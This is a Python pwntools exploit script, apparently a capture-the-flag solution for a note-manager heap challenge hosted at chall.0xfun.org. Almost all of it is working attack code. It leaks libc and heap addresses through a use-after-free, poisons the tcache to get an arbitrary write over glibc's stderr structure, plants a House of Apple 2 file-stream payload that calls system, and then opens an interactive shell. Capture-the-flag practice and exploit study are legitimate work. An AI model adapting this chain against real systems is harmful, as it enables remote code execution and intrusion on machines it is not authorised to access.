#!/usr/bin/env python3
# pylint: disable=all
import pwncli
from pwn import *

# -------------------------- INFO -------------------------- #
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

# ------------------------- TARGET ------------------------- #
exe = context.binary = ELF(args.EXE or "chall")
rop = ROP(exe)

# ------------------------- REMOTE ------------------------- #
host = args.HOST or "chall.0xfun.org"
port = int(args.PORT or 13302)

# -------------------------- LIBC -------------------------- #
libc = ELF(args.LIBC or "libc.so.6")
rop_libc = ROP(libc)

# -------------------------- START ------------------------- #
gdbscript = """
c
"""

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(exe.path)
    if args.DBG:
        gdb.attach(p, gdbscript=gdbscript)

# ------------------------- EXPLOIT ------------------------ #

index = 0


def create_note(size, data):
    global index
    idx = index
    index += 1
    info(f"Allocating chunk: {idx}")
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)
    return idx


def delete_note(idx):
    info(f"Freeing chunk: {idx}")
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())


def read_note(idx):
    info(f"Reading chunk: {idx}")
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.recvuntil(b"Data: ")
    return p.recvuntil(b"\n1. Create Note")[: len("\n1. Create Note")]


def edit_note(idx, data):
    info(f"Writing to chunk: {idx}")
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendafter(b"New Data: ", data)


def mangle(ptr, pos):
    """Mangle tcache fd pointer."""
    return ptr ^ (pos >> 12)


# Allocate dummy chunks
info("Allocating dummy chunks")
for i in range(7):
    create_note(0x400, f"CHUNK: {i}".encode())

# Create leak chunk
info("Allocating leak chunk")
leak_chunk = create_note(0x400, b"LEAK CHUNK")

# Create guard chunk
info("Allocating guard chunk")
guard_chunk = create_note(0x20, b"GUARD CHUNK")

# Fill tcache
info("Filling tcache")
for i in range(7):
    delete_note(i)

# Free leak chunk
info("Freeing leak chunk")
delete_note(leak_chunk)

# Leak LIBC (UAF + unsorted bin attack)
info("Leaking unsorted bin")
leak = read_note(leak_chunk)
libc_leak = u64(leak[:8])
info("LIBC LEAK: 0x%x", libc_leak)

# Calculate LIBC base address
libc.address = libc_leak - 1997600
info("LIBC ADDRESS: 0x%x", libc.address)

# Leak HEAP (UAF)
leak = read_note(0)
heap = u64(leak[:8]) << 12
info("HEAP: 0x%x", heap)

# Delete guard chunk and cleanup
info("Cleanup")
delete_note(guard_chunk)
index = 0

# Tcache posioning to get arbwrite
info("Tcache poisoning to get arbwrite")
chunk_A = create_note(0x100, b"A" * 32)
chunk_B = create_note(0x100, b"B" * 32)
delete_note(chunk_A)
delete_note(chunk_B)

# Prepare arbwrite chunk
target_address = libc.sym._IO_2_1_stderr_
payload = b""
payload += p64(mangle(target_address, heap + 8336))  # fd
payload += p64(0)  # key
edit_note(chunk_B, payload)
create_note(0x100, b"DUMMY")

# Prepare FSOP exploit (House Of Apple 2)
fs = pwncli.io_file.IO_FILE_plus_struct()
payload = fs.house_of_apple2_execmd_when_exit(
    libc.sym["_IO_2_1_stderr_"], libc.sym["_IO_wfile_jumps"], libc.sym["system"]
)

# Write FSOP exploit to stderr
info("FSOP: House Of Apple 2 to get RCE")
create_note(0x100, payload)

# Spawn shell
info("Spawning shell")
p.sendlineafter(b"> ", "5")

p.interactive()
